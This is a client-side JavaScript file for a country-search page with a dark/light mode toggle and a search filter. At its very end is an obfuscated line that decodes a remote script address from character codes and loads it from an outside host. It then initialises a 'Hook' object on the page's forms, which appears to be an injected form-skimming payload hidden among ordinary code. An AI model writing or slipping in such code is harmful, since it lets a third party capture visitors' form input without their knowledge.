const searchInput = document.getElementById("countrySearch");

const initTogglerBtn = () => {
  if (localStorage.getItem("modeSwitch") === "light") {
    toggleModeBtn.classList.add("btn-outline-dark");
    toggleModeBtn.classList.remove("btn-outline-light");
    toggleModeBtn.innerHTML = '<i class="fas fa-moon"></i>';
  } else {
    toggleModeBtn.classList.add("btn-outline-light");
    toggleModeBtn.classList.remove("btn-outline-dark");
    toggleModeBtn.innerHTML = '<i class="fas fa-sun"></i>';
  }
};

const toggleLightDarkMode = () => {
  if (localStorage.getItem("modeSwitch") === "dark") {
    toggleLightMode();
  } else {
    toggleDarkMode();
  }
  initTogglerBtn();
};

const toggleLightMode = () => {
  document.querySelectorAll(".bg-dark").forEach((element) => {
    element.classList.remove("bg-dark");
    element.classList.add("bg-light");
  });
  document.querySelectorAll(".table-dark").forEach((element) => {
    element.classList.remove("table-dark");
    element.classList.add("table-light");
  });
  document.querySelectorAll(".text-white").forEach((element) => {
    if (!element.classList.contains("no-change")) {
      element.classList.remove("text-white");
      element.classList.add("text-dark");
    }
  });
  document.querySelectorAll(".btn-dark").forEach((element) => {
    element.classList.remove("btn-dark");
    element.classList.add("btn-light");
  });

  document.querySelectorAll(".btn-outline-light").forEach((element) => {
    element.classList.remove("btn-outline-light");
    element.classList.add("btn-outline-dark");
  });
  saveModeToLS("light");
};

const toggleDarkMode = () => {
  document.querySelectorAll(".bg-light").forEach((element) => {
    element.classList.remove("bg-light");
    element.classList.add("bg-dark");
  });
  document.querySelectorAll(".table-light").forEach((element) => {
    element.classList.remove("table-light");
    element.classList.add("table-dark");
  });
  document.querySelectorAll(".text-dark").forEach((element) => {
    if (!element.classList.contains("no-change")) {
      element.classList.remove("text-dark");
      element.classList.add("text-white");
    }
  });
  document.querySelectorAll(".btn-light").forEach((element) => {
    element.classList.remove("btn-light");
    element.classList.add("btn-dark");
  });
  document.querySelectorAll(".btn-outline-dark").forEach((element) => {
    element.classList.remove("btn-outline-dark");
    element.classList.add("btn-outline-light");
  });
  saveModeToLS("dark");
};

const saveModeToLS = (mode) => {
  localStorage.removeItem("modeSwitch");
  localStorage.setItem("modeSwitch", mode);
};

const getModeFromLS = () => {
  const mode = localStorage.getItem("modeSwitch");

  if (mode === "light") {
    toggleLightMode();
  } else {
    toggleDarkMode();
  }
};

const toggleDetaiSpinner = (type) => {
  const spinner = document.getElementById("detailSpinner");
  const detailContainer = document.getElementById("detailContainer");
  if (type === "success") {
    spinner.classList.remove("d-flex");
    detailContainer.classList.remove("d-none");
  } else if (type === "loading") {
    spinner.classList.add("d-flex");
    detailContainer.classList.add("d-none");
  } else {
    spinner.classList.add("d-flex");
    detailContainer.classList.add("d-none");
    alert("STH WENT WRONG");
  }
};

const searchList = () => {
  const countryNames = document.querySelectorAll(".countryName");
  const search = searchInput.value;

  countryNames.forEach((name) => {
    const countryName = name.textContent;
    console.log();

    const parent = name.parentElement;
    if (search.length > 0) {
      if (countryName.toString().toLowerCase().includes(search.toLowerCase())) {
        parent.style.display = "block";
      } else {
        parent.style.display = "none";
      }
    } else {
      parent.style.display = "block";
    }
  });
};

toggleModeBtn.addEventListener("click", toggleLightDarkMode);
searchInput.addEventListener("keyup", searchList);

window.onload = () => {
  initTogglerBtn();
};
getModeFromLS();

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b